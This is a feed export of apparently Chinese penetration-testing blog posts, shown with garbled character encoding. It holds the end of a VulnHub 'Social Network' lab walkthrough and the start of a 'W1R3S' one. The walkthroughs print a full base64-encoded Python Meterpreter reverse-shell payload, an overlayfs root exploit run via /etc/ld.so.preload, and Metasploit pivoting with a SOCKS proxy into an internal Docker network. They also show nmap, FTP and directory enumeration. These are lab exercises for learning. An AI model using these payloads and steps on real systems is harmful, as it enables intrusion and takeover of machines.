class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ wget http://192.168.135.141:8888/ofs<br><br>john@socnet:~$ wget http://192.168.135.141:8888/ofs-lib.so<br><br>john@socnet:~$ ./ofs<br>-bash: ./ofs: Permission denied<br>john@socnet:~$ chmod +x ofs<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>Password: <br>su: Authentication failure<br>john@socnet:~$ ls<br>ofs  ofs-lib.so<br>john@socnet:~$ mv ofs-lib.so /tmp<br>john@socnet:~$ ls<br>ofs<br>john@socnet:~$ ls /tmp<br>ofs-lib.so<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root),1001(john)<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ SSH æ‹·è´æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> scp ./exp john@192.168.135.151:/tmp</span> <br><span class="hljs-meta">$</span><span class="bash"> scp /tmp/ofs-lib.so john@192.168.135.151:/tmp</span><br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><ol><li>web ç«¯å£æ‰«æã€ç›®å½•æ‰«æ</li><li>python ä»£ç æ‰§è¡Œï¼šåå¼¹ shell</li><li>dockerï¼šå†…ç½‘æ¸—é€</li><li>å†…ç½‘æ¸—é€ï¼šä¸»æœºå‘ç°ã€å†…ç½‘ç©¿é€ã€å†…ç½‘æ‰«æã€Elasticsearchæ¼æ´</li><li>Hash çˆ†ç ´ï¼šHashcat</li><li>å†…æ ¸ææƒ</li></ol><h2 id="äº”ã€MSF"><a href="#äº”ã€MSF" class="headerlink" title="äº”ã€MSF"></a>äº”ã€MSF</h2><blockquote><p><a href="https://www.anquanke.com/post/id/204066#h2-5">Vulnhub | Social Network æ¸—é€é¶æœº - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p></blockquote><h3 id="åå¼¹-shell"><a href="#åå¼¹-shell" class="headerlink" title="åå¼¹ shell"></a>åå¼¹ shell</h3><p>ä½¿ç”¨ <code>msfvenom</code> ç”Ÿæˆ python æœ¨é©¬ï¼Œåå¼¹ shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.135.141 LPORT=4444</span><br>[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload<br>[-] No arch selected, selecting arch: python from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 501 bytes<br>exec(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTM1LjE0MScsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==&#x27;)[0]))<br></code></pre></td></tr></table></figure><p>å¯åŠ¨MSFï¼Œè®¾ç½® Payload ç›‘å¬ï¼Œå†æŠŠç”Ÿæˆçš„æœ¨é©¬æ”¾åˆ° web æäº¤ï¼ŒæˆåŠŸåå¼¹ shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br><br>msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (generic/shell_reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST                   yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br><br>msf6 exploit(multi/handler) &gt; set LHOST 192.168.135.141<br>LHOST =&gt; 192.168.135.141<br>msf6 exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcp<br>payload =&gt; python/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (python/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br><br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br><br>[*] Sending stage (39560 bytes) to 192.168.135.151<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.151:53585) at 2022-07-01 10:38:01 -0400<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ª docker ï¼Œéš¾é“è¦ docker é€ƒé€¸ï¼Ÿå›å¤´çœ‹äº†çœ‹é¶æœºä½œè€…çš„æç¤ºï¼Œæœ‰ä¸€ä¸ª pivoting è·³æ¿æ”»å‡»ï¼Œåº”è¯¥æ˜¯ä»¥è¿™å°æœºå™¨å½“è·³æ¿ ã€‚</p><h3 id="è‡ªåŠ¨è·¯ç”±"><a href="#è‡ªåŠ¨è·¯ç”±" class="headerlink" title="è‡ªåŠ¨è·¯ç”±"></a>è‡ªåŠ¨è·¯ç”±</h3><p>æ¥ä¸‹æ¥å°±æ˜¯è®¾ç½®è‡ªåŠ¨è·¯ç”±ï¼Œæ‰«æä¸€ä¸‹è¿™ä¸ª docker çš„å±€åŸŸç½‘ç¯å¢ƒï¼Œå…ˆçœ‹çœ‹ docker1 çš„ç½‘ç»œä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; ifconfig<br><br>Interface  1<br>============<br>Name         : lo<br>Hardware MAC : 00:00:00:00:00:00<br>MTU          : 65536<br>Flags        : UP LOOPBACK RUNNING<br>IPv4 Address : 127.0.0.1<br>IPv4 Netmask : 255.0.0.0<br><br>Interface  6<br>============<br>Name         : eth0<br>Hardware MAC : 02:42:ac:11:00:03<br>MTU          : 1500<br>Flags        : UP BROADCAST RUNNING MULTICAST<br>IPv4 Address : 172.17.0.2<br>IPv4 Netmask : 255.255.0.0<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ msf çš„ autoroute æ¨¡å—è‡ªåŠ¨è·¯ç”±ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; run autoroute -s 172.17.0.0/16# æ·»åŠ è·¯ç”±<br><br>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>[!] Example: run post/multi/manage/autoroute OPTION=value [...]<br>[*] Adding a route to 172.17.0.0/255.255.0.0...<br>[+] Added route to 172.17.0.0/255.255.0.0 via 192.168.135.151<br>[*] Use the -p option to list all active routes<br>meterpreter &gt; run autoroute -p# æŸ¥çœ‹è·¯ç”±<br><br>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>[!] Example: run post/multi/manage/autoroute OPTION=value [...]<br><br>Active Routing Table<br>====================<br><br>   Subnet             Netmask            Gateway<br>   ------             -------            -------<br>   172.17.0.0         255.255.0.0        Session 1<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>å¯¹å†…ç½‘è¿›è¡Œç«¯å£æ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; run auxiliary/scanner/portscan/tcp rhosts=172.17.0.0/24<br><br>[+] 172.17.0.1:           - 172.17.0.1:22 - TCP OPEN<br>[+] 172.17.0.1:           - 172.17.0.1:5000 - TCP OPEN<br>[+] 172.17.0.2:           - 172.17.0.2:5000 - TCP OPEN<br>[+] 172.17.0.3:           - 172.17.0.3:9200 - TCP OPEN<br>[+] 172.17.0.3:           - 172.17.0.3:9300 - TCP OPEN<br>[*] 172.17.0.0/24:        - Scanned  26 of 256 hosts (10% complete)<br>[*] 172.17.0.0/24:        - Scanned  52 of 256 hosts (20% complete)<br>[*] 172.17.0.0/24:        - Scanned  77 of 256 hosts (30% complete)<br>[*] 172.17.0.0/24:        - Scanned 103 of 256 hosts (40% complete)<br>[*] 172.17.0.0/24:        - Scanned 128 of 256 hosts (50% complete)<br>[*] 172.17.0.0/24:        - Scanned 154 of 256 hosts (60% complete)<br>[*] 172.17.0.0/24:        - Scanned 180 of 256 hosts (70% complete)<br>[*] 172.17.0.0/24:        - Scanned 205 of 256 hosts (80% complete)<br>[*] 172.17.0.0/24:        - Scanned 231 of 256 hosts (90% complete)<br>[*] 172.17.0.0/24:        - Scanned 256 of 256 hosts (100% complete)<br></code></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿åç»­æ¸—é€ï¼Œå»ºç«‹ socks ä»£ç†ã€‚</p><h3 id="msf-çš„ä»£ç†æ¨¡å—-proxychains4"><a href="#msf-çš„ä»£ç†æ¨¡å—-proxychains4" class="headerlink" title="msf çš„ä»£ç†æ¨¡å— + proxychains4"></a>msf çš„ä»£ç†æ¨¡å— + proxychains4</h3><p>è®©ä¼šè¯åœ¨åå°è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; background# è®© meterpreter ä¼šè¯åœ¨åå°è¿è¡Œ<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; sessions -l# æŸ¥çœ‹ä¼šè¯å‘½ä»¤<br><br>Active sessions<br>===============<br><br>  Id  Name  Type                      Information          Connection<br>  --  ----  ----                      -----------          ----------<br>  1         meterpreter python/linux  root @ dbca22cf339d  192.168.135.141:4444 -&gt; 192.168.135.151:55647 (192.168.135.151)<br><br>msf6 exploit(multi/handler) &gt; sessions 1# è¿›å…¥ä¼šè¯<br>[*] Starting interaction with 1...<br><br>meterpreter &gt; background<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; <br></code></pre></td></tr></table></figure><p>é…ç½® socks æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy<br>msf6 auxiliary(server/socks_proxy) &gt; show options<br><br>Module options (auxiliary/server/socks_proxy):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   PASSWORD                   no        Proxy password for SOCKS5 listener<br>   SRVHOST   0.0.0.0          yes       The address to listen on<br>   SRVPORT   1080             yes       The port to listen on<br>   USERNAME                   no        Proxy username for SOCKS5 listener<br>   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)<br><br><br>Auxiliary action:<br><br>   Name   Description<br>   ----   -----------<br>   Proxy  Run a SOCKS proxy server<br><br><br>msf6 auxiliary(server/socks_proxy) &gt; run<br>[*] Auxiliary module running as background job 0.<br>msf6 auxiliary(server/socks_proxy) &gt; <br>[*] Starting the SOCKS proxy server<br><br></code></pre></td></tr></table></figure><p>é…ç½® proxychains4 é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo vim /etc/proxychains4.conf</span><br><span class="hljs-meta">#</span><span class="bash"> socks5 127.0.0.1 1080</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨ proxychains4 ä»£ç†å„ç§å·¥å…·è¿›å…¥ docker 1 çš„ 172.17 ç½‘æ®µ ã€‚</p><h3 id="å†…ç½‘æ‰«æ-1"><a href="#å†…ç½‘æ‰«æ-1" class="headerlink" title="å†…ç½‘æ‰«æ"></a>å†…ç½‘æ‰«æ</h3><blockquote><p>è‡³äºå¦‚ä½•æ‰«æ 172 ç½‘æ®µçš„ä¿¡æ¯ï¼Œå¯ä»¥å°† nmap ä¸Šä¼ åˆ°é¶æœºï¼Œå°±åœ¨æœ¬åœ°æ‰«æï¼Œè¿™æ ·å¿«ç¨³å¾ˆå¤šï¼Œè®°å¾—è¦æ·»åŠ  nmap æ‰§è¡Œæƒé™ã€‚</p></blockquote><p>åœ¨é…ç½®å¥½ä»£ç†ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨ kali çš„ä»£ç†å·¥å…· proxychains4 è¿›è¡Œå†…ç½‘æ¸—é€ ï¼š</p><blockquote><p>proxychains ä¸ä»£ç† UDPï¼ŒICMPï¼ŒSYN ç½‘ç»œåè®®ï¼Œæ— æ³•è¿›è¡Œç³»ç»Ÿæ¢æµ‹ï¼Œä¸»æœºå‘ç°ç­‰ç­‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨ <code>-sT</code> å‚æ•°å¹¶ç»“åˆ <code>-Pn</code> è¿›è¡Œ TCPç«¯å£æ‰«æ  ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p9200,9300 172.17.0.3</span><br>Nmap scan report for 172.17.0.3 (172.17.0.3)<br>Host is up (0.057s latency).<br><br>PORT     STATE SERVICE  VERSION<br>9200/tcp open  wap-wsp?<br>9300/tcp open  vrace?<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port9200-TCP:V=7.91%I=7%D=7/3%Time=62C170E3%P=x86_64-pc-linux-gnu%r(RTS<br>SF:PRequest,4F,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20<br>SF:charset=UTF-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(SIPOptions,4F,&quot;HTTP/1<br>SF:\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20charset=UTF-8\r\nCo<br>SF:ntent-Length:\x200\r\n\r\n&quot;);<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 122.26 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl http://172.17.0.3:9200</span>             <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;status&quot; : 200,<br>  &quot;name&quot; : &quot;Baphomet&quot;,<br>  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,<br>  &quot;version&quot; : &#123;<br>    &quot;number&quot; : &quot;1.4.2&quot;,<br>    &quot;build_hash&quot; : &quot;927caff6f05403e936c20bf4529f144f0c89fd8c&quot;,<br>    &quot;build_timestamp&quot; : &quot;2014-12-16T14:11:12Z&quot;,<br>    &quot;build_snapshot&quot; : false,<br>    &quot;lucene_version&quot; : &quot;4.10.2&quot;<br>  &#125;,<br>  &quot;tagline&quot; : &quot;You Know, for Search&quot;<br>&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl http://172.17.0.3:9300</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9300  ...  OK<br>curl: (52) Empty reply from server<br></code></pre></td></tr></table></figure><p>å¼€æ”¾ 9200 å’Œ 9300 ç«¯å£ï¼Œé€šè¿‡æœç´¢å‘ç° 9200 æ˜¯ ElasticSearch æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªåŸºäº Lucene çš„æœç´¢æœåŠ¡å™¨ï¼Œä½¿ç”¨ Java è¯­è¨€å¼€å‘çš„ ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>W1R3Säº¤æµ</title>
    <link href="/2022/06/30/Penetration/Vulnhub/W1R3S%E4%BA%A4%E6%B5%81/"/>
    <url>/2022/06/30/Penetration/Vulnhub/W1R3S%E4%BA%A4%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<h1 id="W1R3Säº¤æµ"><a href="#W1R3Säº¤æµ" class="headerlink" title="W1R3Säº¤æµ"></a>W1R3Säº¤æµ</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">W1R3S: 1.0.1 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.145</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.145</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.145</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>å…¶ä»–</th></tr></thead><tbody><tr><td>21/tcp</td><td>open</td><td>ftp</td><td>Anonymous FTP login allowed</td></tr><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td></td></tr><tr><td>3306/tcp</td><td>open</td><td>mysql</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>21ç«¯å£</strong></p><blockquote><p>FTP çš„åŒ¿åç™»å½•ä¸€èˆ¬æœ‰ä¸‰ç§ï¼š</p><ul><li>ç”¨æˆ·åï¼šanonymousï¼›å¯†ç ï¼šEmailæˆ–è€…ä¸ºç©º</li><li>ç”¨æˆ·åï¼šFTPï¼›å¯†ç ï¼šFTPæˆ–è€…ä¸ºç©º</li><li>ç”¨æˆ·åï¼šUSERï¼›å¯†ç ï¼špass</li></ul><p>ftp å‘½ä»¤å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_38526635/article/details/82147980">FTPå¸¸è§å‘½ä»¤è¯¦è§£_luckycyongçš„åšå®¢-CSDNåšå®¢</a></p></blockquote><p>ftp å­˜åœ¨åŒ¿åç™»é™†ï¼ˆç”¨æˆ·åanonymousï¼Œå¯†ç ä¸ºç©ºï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ftp 192.168.135.145</span><br></code></pre></td></tr></table></figure><p>ä¸‹è½½æ•´ä¸ªftpç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget ftp://192.168.135.145/* --ftp-user=anonymous --ftp-password= -r</span> <br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯ã€‚</p><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ sshã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh 192.168.135.145</span><br>----------------------<br>Think this is the way?<br>----------------------<br>Well,........possibly.<br>----------------------<br>kali@192.168.135.145&#x27;s password: <br></code></pre></td></tr></table></figure><p><strong>3306ç«¯å£</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql -h 192.168.135.145 -P 3306 -uroot -p</span><br>Enter password: <br>ERROR 1130 (HY000): Host &#x27;192.168.135.141&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure><p><strong>80ç«¯å£</strong></p><p>dirb çˆ†ç ´ç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.145:80</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†å‡ ä¸ªé‡è¦çš„ç›®å½•ï¼š/administrator å’Œ /wordpress ã€‚</p><p>å…ˆè®¿é—® <a href="http://192.168.135.145/administratorï¼Œå‘ç°è¿™ä¸ªæ˜¯">http://192.168.135.145/administratorï¼Œå‘ç°è¿™ä¸ªæ˜¯</a> Cuppa CMS çš„å®‰è£…è®¾ç½®ï¼ŒçŒœæµ‹å¯èƒ½å·²ç»å®‰è£…äº† Cuppa CMS ã€‚</p><p>å†è®¿é—® <a href="http://192.168.135.145/wordpressï¼Œå‘ç°æ‰“ä¸å¼€ï¼Œç›´æ¥">http://192.168.135.145/wordpressï¼Œå‘ç°æ‰“ä¸å¼€ï¼Œç›´æ¥</a> wpscan æ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 